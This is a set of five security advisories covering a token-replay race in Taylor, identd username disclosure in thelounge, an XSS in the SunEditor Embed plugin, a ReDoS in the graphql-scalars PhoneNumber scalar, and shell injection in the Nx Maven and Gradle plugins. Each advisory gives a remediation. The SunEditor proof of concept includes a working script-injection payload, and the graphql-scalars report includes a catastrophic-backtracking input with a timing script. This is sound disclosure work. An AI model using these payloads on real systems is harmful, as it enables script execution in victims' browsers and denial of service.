summary: Taylor has race condition in /get-patch that allows purchase token replay
details:
Hi team,

I was looking at the recent fix and you limited the exploitability of race conditions but unfortunately it is still possible to exploit the issue since two requests happening at the exact same time will still go through. You should be able to completely fix the race conditions by leveraging SQLITE write lock and just send one query.

### Summary
The /get-patch endpoint processes a purchase in two separate database queries: a SELECT that verifies the token is unused, followed by an UPDATE that marks the token as used. Because SQLite only guards each statement, a malicious actor can issue two requests at the exact same moment and have both SELECT statements succeed before either UPDATE runs.

### Details

The handler executes (step 1):

```
SELECT id, token_used_at FROM purchases WHERE patch_id = ? AND purchase_token = ? AND status = 'COMPLETED'
```

If token_used_at IS NULL, the request passes the check (step 2): 
```
        if (row.token_used_at) {
            return res.status(403).json({ error: "Purchase token has already been used." });
        }
```


The handler finally runs (step 3):

```
UPDATE purchases SET token_used_at = CURRENT_TIMESTAMP WHERE id = ?
```


When two requests arrive at the same time, they both finish step 1 while the row is still unused. SQLite serializes writers only per statement, so each request believes it has exclusive access. Both decrypt and return the patch, and both UPDATE statements succeed.

### PoC
To perform this attack, you need to send two requests at the exact same time. 

### Impact
An attacker who possesses a valid purchase token can replay it and receive multiple copies of the paid patch, or distribute one copy while still keeping their own. This results in revenue loss and undermines license enforcement.


### Remediation

Replace the read-then-write sequence with a single atomic statement that both validates and consumes the token while SQLite holds the write lock:

```
const row = db.prepare(`
  UPDATE purchases
     SET token_used_at = CURRENT_TIMESTAMP
   WHERE patch_id       = ?
     AND purchase_token = ?
     AND status         = 'COMPLETED'
     AND token_used_at IS NULL
  RETURNING id;
`).get(patchId, token);

if (!row) return res.status(403).json({ error: 'Invalid or already-used token.' });
```

summary: thelounge may publicly disclose of all usernames/idents via port 113
details:
Per RFC 1413, The unique identifying tuple includes not only the ports, but also the both addresses. Without the addresses, the information becomes both non-unique and public:
- If multiple connections happen to use the same local port number (which is possible if the addresses differ), the username of the first is returned for all, resulting in the wrong ident for all but the first.
- By not checking the connection address, the information becomes public. Because there is only a relatively small number of local ports, and the remote ports are likely to be either 6667 or 6697, it becomes trivial to scan the entire range to get a list of idents.

To prevent this from happening, disable identd or upgrade to a non vulnerable version.

summary: SunEditor Embed Plugin has DOM XSS via External Script Element After Iframe Embed
details:
Summary

A DOM-based Cross-Site Scripting (XSS) vulnerability exists in the SunEditor Embed plugin. Crafted iframe embed HTML followed by an external <script src=...> element bypasses the plugin’s sanitization logic. The plugin recreates and appends the attacker-controlled script element to the live DOM, causing JavaScript execution in the context of the editor page.

If an application stores or reflects SunEditor content without additional backend sanitization, this can lead to stored or reflected XSS when another user opens, previews, renders, or edits the malicious content.

Details

The Embed plugin parses raw embed HTML and processes the resulting DOM nodes. When a <script> element is included after a valid iframe, the plugin creates a new script element using the attacker-controlled src value and appends it to the DOM.

Relevant behavior:

const embedDOM = new DOMParser().parseFromString(src, 'text/html').body.children;
if (/^script$/i.test(chd.nodeName)) {
  scriptTag = dom.utils.createElement('script', {
    src: chd.getAttribute('src'),
    async: 'true'
  }, null);
  continue;
}
cover.appendChild(scriptTag);

Because the script is newly created and appended, it executes.

PoC

Start a local server hosting a JavaScript payload:

```
mkdir -p /tmp/suneditor-poc
cd /tmp/suneditor-poc

cat > poc.js <<'EOF'
alert(1);
console.log("SunEditor Embed Plugin XSS executed");
EOF

python3 -m http.server 8000
```

Open SunEditor with the Embed plugin enabled, then insert the following payload through the Embed modal and save :

`<iframe src="https://youtube.com/embed/x"></iframe><script src="http://127.0.0.1:8000/poc.js"></script>
`
Successful exploitation is confirmed when:

`alert(1) appears`

or the local server logs:

`GET /poc.js`

Impact

An attacker who can provide or store embed HTML can execute arbitrary JavaScript in another user’s browser when the content is processed by SunEditor. This may allow account actions as the victim, modification of editor content, or access to sensitive data available in the editor page.

The issue is especially impactful when SunEditor content is stored in a backend and later reopened or rendered for administrators, editors, or other users without additional sanitization.

Suggested Fix

Do not recreate or append script elements from user-controlled embed HTML.

Minimum mitigation:

```
if (/^script$/i.test(chd.nodeName)) {
  continue;
}
```

A stronger fix is to allow only expected embed elements such as iframe or blockquote, sanitize their attributes, and discard all other sibling elements.

summary: graphql-scalars PhoneNumber scalar is vulnerable to regular expression denial of service
details:
## Summary

The regular expression behind `GraphQLPhoneNumber` since 1.24.1 backtracks exponentially. A string made of a run of digits followed by one character that makes the match fail (for example `"1".repeat(30) + "x"`) blocks the JavaScript thread for seconds, and every additional digit doubles the time.

graphql-js calls `parseLiteral` while *validating* a document and `parseValue` while coercing variables, so the regex runs for every request that merely contains such a value in a `PhoneNumber` position, before execution and before any authentication or authorization step of the server. One small unauthenticated request is enough to stall a server process.

## Affected versions

- `graphql-scalars` >= 1.24.1, <= 2.0.0 (2.0.0 is the current `latest`; the default branch still has the same pattern).
- Not affected: 1.24.0 and the earlier versions I checked (1.22.4, 1.23.0), which use the linear `/^\+[1-9]\d{6,14}$/`.
- Introduced by #2719 (c7f58da16, "PhoneNumber scalar is not fully compatible with E.164 format so updated regex to support phone number with extension"), released as 1.24.1 on 2025-01-29.

The payload was ran against 1.22.4, 1.23.0, 1.24.0, 1.24.1, 1.24.2, 1.25.0, 1.26.0 and 2.0.0: the first three reject it instantly, the other five show the exponential growth.

## Root cause

`src/scalars/PhoneNumber.ts`:

```js
const PHONE_NUMBER_REGEX = /^\+?\d{1,3}(\-|\x20)?\(?\d+\)?((\-|\x20)?\d+)+$/;
```

In `\d+\)?((\-|\x20)?\d+)+$` the separator is optional, so a run of n digits can be split across the inner `\d+` and the outer `+` iterations in a number of ways that is exponential in n. When the overall match fails, for instance on a trailing non-digit, the engine tries all of them.

## Proof of concept

1. The scalar alone (`npm i graphql graphql-scalars@2.0.0`):

```js
import { GraphQLPhoneNumber } from 'graphql-scalars';

for (const ok of ['+41791234567', '079 123 45 67', '+1 (123) 456-7890', 'nope']) {
  try { GraphQLPhoneNumber.parseValue(ok); } catch {}
}
for (const digits of [24, 26, 28, 30]) {
  const start = performance.now();
  try { GraphQLPhoneNumber.parseValue('1'.repeat(digits) + 'x'); } catch {}
  console.log(`${digits} digits: ${((performance.now() - start) / 1000).toFixed(2)} s`);
}
```

Measured warm, i.e. after ordinary inputs have been validated like in a running server:

| digits | Node 22.19.0 | Node 26.10.0 |
|-------:|-------------:|-------------:|
| 24 | 0.10 s | 0.07 s |
| 26 | 0.41 s | 0.29 s |
| 28 | 1.63 s | 1.14 s |
| 30 | 6.59 s | 4.62 s |

The time doubles with every digit. The first execution of the regex in a fresh process is about 5x slower because V8 interprets a regexp on its first run (Node 22.19.0, 28 digits: 7.8 s).

2. Through graphql-js, no server and no authentication: a schema with a single `echo(phone: PhoneNumber)` field, 26 digits + `x`, Node 22.19.0, warm:

| | literal (`parseLiteral`, validation) | variable (`parseValue`, coercion) |
|---|---:|---:|
| graphql 16.14.2 | 0.41 s | 0.43 s |
| graphql 17.0.2 | 0.41 s | 0.83 s (evaluated twice) |

3. Also reproduced end to end against a GraphQL Yoga server: an anonymous HTTP request with a 27-digit value plus one invalid character stalled the whole process (a concurrent trivial `{ __typename }` request waited as long). A mutation that requires authentication was affected equally when called anonymously, because document validation runs before any authorization in resolvers or context.

## Impact

Denial of service. Any GraphQL server that exposes `PhoneNumber` on an argument, an input object field or a variable can be stalled by a request of about 30 characters; roughly 40 characters would keep a process busy for hours (extrapolated from the doubling, not measured). `serialize` uses the same regex, so unvalidated stored values returned through a `PhoneNumber` field are affected too. The actual severity depends on the scalar being applied to untrusted input, which is the typical case.

## Suggested fix

An equivalent pattern without ambiguous splits:

```js
const PHONE_NUMBER_REGEX = /^\+?\d{1,3}[- ]?\(?\d(?:\d*\))?(?:[- ]?\d)+$/;
```

It accepts exactly the same strings as the current one, so there is no behaviour change: with `N = (S?\d+)+ = (S?\d)+` a digit run is just repeated single-digit iterations, hence `\d+\)?N = \d(\d*\))?N`. Verification:

- exhaustive comparison of old and new pattern on every string up to length 9 over `1 + - space ( ) x`: 47,079,208 strings (1,832 accepted), 0 differences;
- every sequence of up to 6 tokens from `1 11 111 1111 11111 + - space ( ) x`: 1,948,717 strings (100,380 accepted), 0 differences;
- adversarial inputs (digit runs plus a failing character, digit/space and digit/dash alternations, parenthesis variants) scale linearly: 1,000,000 characters take about 10 ms, where the current pattern needs 0.3 s for 26.

Optionally also reject values above a sane length before matching; the grammar currently has no upper bound and E.164 allows at most 15 digits. Above roughly 10 million characters V8 aborts the match with a `RangeError` (stack) after about 25 ms instead of returning false.

A regression test that fails with the current implementation: `GraphQLPhoneNumber.parseValue('1'.repeat(40) + 'x')` must throw its validation error immediately; with the current pattern it does not return in any reasonable time.

## Workarounds for users until a fix is released

- Replace the scalar in the schema with one that uses the pattern above.
- Run Node with `--enable-experimental-regexp-engine-on-excessive-backtracks`, or call `v8.setFlagsFromString('--enable-experimental-regexp-engine-on-excessive-backtracks')` before the regex first runs. V8 then falls back to its linear-time engine after excessive backtracking; verified on Node 22.19, 24.15 and 26.10. The flag is not accepted in `NODE_OPTIONS`.
- Pinning `graphql-scalars` to <= 1.24.0 restores a linear pattern but changes which values are accepted (only `+` prefixed E.164).

## Coordination

We have not disclosed this publicly. We maintain Unchained Engine (`@unchainedshop/api`), a downstream project that exposes this scalar on public input fields and will need to ship a mitigation of its own, so we would like to coordinate the timing of any public disclosure with you. Please let us know your preferred timeline, and whether you would like us to prepare a pull request (we can work in a temporary private fork if you enable one).

summary: @nx/maven and @nx/gradle have OS command injection via nx.json plugin options
details:
## Summary

`@nx/maven` and `@nx/gradle` spawn their project-graph analyzers through a shell and interpolate plugin options read from `nx.json` straight into the command line. Because a shell parses the whole line, an option value containing shell syntax is executed as a command by any `nx` command that constructs the project graph. Anyone who clones a hostile repository, or who checks out a pull request that edits `nx.json`, runs the injected command with their own privileges.

## Severity

A victim who runs an ordinary `nx` command in an attacker-supplied Maven or Gradle workspace gets code execution as themselves. In most such workspaces an attacker who can write `nx.json` can already run code through the repository's build files (`./mvnw`, `pom.xml`, and the Gradle equivalents), so the genuinely new exposure is narrow — for example CI building a fork's pull request where `nx.json` is writable but the build files are not. We have no evidence of exploitation in the wild.

## Affected & Patched Versions

| Package | Vulnerable | Patched |
| --- | --- | --- |
| `@nx/maven` | `>= 22.0.2, < 22.7.9`; `>= 23.0.0, < 23.1.2` | `22.7.9`, `23.1.2` |
| `@nx/gradle` | `>= 21.0.0, < 22.7.9`; `>= 23.0.0, < 23.1.2` | `22.7.9`, `23.1.2` |

> [!IMPORTANT]
> Workspaces that register neither `@nx/maven` nor `@nx/gradle` in `nx.json` are unaffected — the vulnerable code only runs from those plugins' graph-construction paths, and no other Nx plugin shares this pattern.

## Remediation

Upgrade to **22.7.9** (22.x line) or **23.1.2** (23.x line) or later:

```
nx migrate 23.1.2
```

Upgrade both `nx` and the affected plugin (`@nx/maven` and/or `@nx/gradle`). The plugin's fix depends on code that ships in the `nx` package, so bumping the plugin without a matching `nx` upgrade will not resolve it.

There is no configuration to change — upgrading is the whole fix. If you cannot upgrade yet, only run `nx` commands in repositories you trust, since a malicious `nx.json` can execute code on a vulnerable version.

## Details

Both plugins spawn their analyzer through a shell and interpolate `nx.json` plugin options into the command, so those option values are shell source. For Maven the injectable value is the `targetNamePrefix` option; for Gradle it is broader, since every plugin option is mapped into a `-P` argument and arbitrary option names are accepted, making both the name and value of any option injectable.

## Credits

- **Arkadiusz Marta** (RE:SOURCE) — Reporter
